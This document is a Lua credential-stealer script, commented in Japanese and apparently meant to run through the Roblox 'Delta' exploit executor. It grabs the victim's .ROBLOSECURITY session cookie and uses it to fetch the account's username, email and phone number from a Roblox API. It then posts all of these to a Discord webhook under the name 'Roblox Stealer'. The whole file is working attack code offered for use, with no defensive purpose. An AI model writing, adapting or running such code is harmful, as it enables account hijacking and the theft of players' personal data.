-- ファイル名: stealer.lua (Delta用)
-- Roblox Delta エクスプロイトで実行想定

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- DiscordウェブックURL（実際のものに置き換えが必要）
local webhook = "https://discord.com/api/webhooks/あなたのID/あなたのトークン"

-- クッキー取得（外部エクスプロイトの関数を想定）
-- Deltaでは getcookie() や getrobuxcookie() などの独自関数が存在する場合がある
local function getRobloxCookie()
    -- 方法1: エクスプロイトに依存する関数
    if getcookie then
        return getcookie(".ROBLOSECURITY")
    end
    -- 方法2: ゲーム内では直接不可能 → 外部ライブラリ経由
    return "Cookie not accessible in pure Luau"
end

-- メール/電話番号を取得（クッキーが必要）
local function getAccountInfo(cookie)
    local url = "https://www.roblox.com/mobileapi/userinfo"
    local headers = {
        ["Cookie"] = ".ROBLOSECURITY=" .. cookie;
        ["User-Agent"] = "Mozilla/5.0"
    }
    local success, response = pcall(function()
        return syn.request({ -- syn.request は多くのエクスプロイトでサポート
            Url = url,
            Method = "GET",
            Headers = headers
        })
    end)
    if success and response.Body then
        local data = HttpService:JSONDecode(response.Body)
        return data.UserName, data.Email, data.TelephoneNumber
    end
    return nil, nil, nil
end

-- Discordへ送信
local function sendToDiscord(content)
    local data = {
        content = content,
        username = "Roblox Stealer"
    }
    local body = HttpService:JSONEncode(data)
    syn.request({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = body
    })
end

-- メイン実行
local cookie = getRobloxCookie()
local username, email, phone = getAccountInfo(cookie)

local message = string.format(
    "```\nROBLOX ACCOUNT INFORMATION\n```\n**Cookie:** `%s`\n**Username:** %s\n**Email:** %s\n**Phone:** %s",
    cookie, username or "N/A", email or "N/A", phone or "N/A"
)

sendToDiscord(message)
